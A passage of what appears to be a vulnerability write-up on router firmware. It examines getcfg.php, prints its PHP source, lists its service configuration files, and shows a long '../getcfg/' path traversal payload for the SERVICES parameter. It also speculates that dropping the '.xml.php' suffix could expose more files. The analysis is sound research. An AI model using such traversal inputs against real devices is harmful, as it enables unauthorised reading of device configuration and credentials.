./htdocs/webinc/getcfg/UPNP.LAN-1.xml.php
./htdocs/webinc/getcfg/QOS.xml.php
./htdocs/webinc/getcfg/PHYINF.WAN-1.xml.php
./htdocs/webinc/getcfg/LAN.xml.php
./htdocs/webinc/getcfg/ROUTE6.STATIC.xml.php
./htdocs/webinc/getcfg/BWC.xml.php
./htdocs/webinc/getcfg/DDNS4.WAN-2.xml.php
./htdocs/webinc/getcfg/DHCPS6.LAN-2.xml.php
./htdocs/webinc/getcfg/FIREWALL6.xml.php
./htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php
./htdocs/webinc/getcfg/IUM.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.WAN-4.xml.php
./htdocs/webinc/getcfg/ICMP.WAN-3.xml.php
./htdocs/webinc/getcfg/ROUTE.DESTNET.xml.php
./htdocs/webinc/getcfg/RUNTIME.INF.WAN-2.xml.php
./htdocs/webinc/getcfg/DDNS4.WAN-3.xml.php
./htdocs/webinc/getcfg/UPNP.LAN-3.xml.php
```

</details>

## Notheworthy about getcfg.php

As the variable `$SERVICE_COUNT` and the content of `$GETCFG_SVC` can be controlled by the user, it cannot be guaranteed that an attacker is unable to manipulate this further by dropping the file extension `.xml.php` that is added as a suffix in the segment `$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";`. 

If an attacker successfully drops the file extension, more files could be exposed. 

An anecdote here is that there is zero to no input validation apart from it being empty (=""). 
Sending a payload for a service such as 
```shell
../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/../getcfg/INSERT_SERVICE_NAME_HERE
```
is also allowed, which will skew the output from getcfg.php due to the extremely long path. 
The absence of the input validation could leave the device exposed to (potentially) other malicious actions.

<details>
	<summary>getcfg.php (Click to expand)</summary>

```php
cat ./htdocs/web/getcfg.php                       
HTTP/1.1 200 OK
Content-Type: text/xml

<?echo "<?";?>xml version="1.0" encoding="utf-8"<?echo "?>";?>
<postxml>
<? include "/htdocs/phplib/trace.php";

if ($_POST["CACHE"] == "true")
{
	echo dump(1, "/runtime/session/".$SESSION_UID."/postxml");
}
else
{
	if($AUTHORIZED_GROUP < 0)
	{
		/* not a power user, return error message */
		echo "\t<result>FAILED</result>\n";
		echo "\t<message>Not authorized</message>\n";
	}
	else
	{
		/* cut_count() will return 0 when no or only one token. */
		$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
		TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
		$SERVICE_INDEX = 0;
		while ($SERVICE_INDEX < $SERVICE_COUNT)
		{
			$GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
			TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
			if ($GETCFG_SVC!="")
			{
				$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
				/* GETCFG_SVC will be passed to the child process. */
				if (isfile($file)=="1") dophp("load", $file);
			}
			$SERVICE_INDEX++;
		}
	}
}
?></postxml>
```

</details>

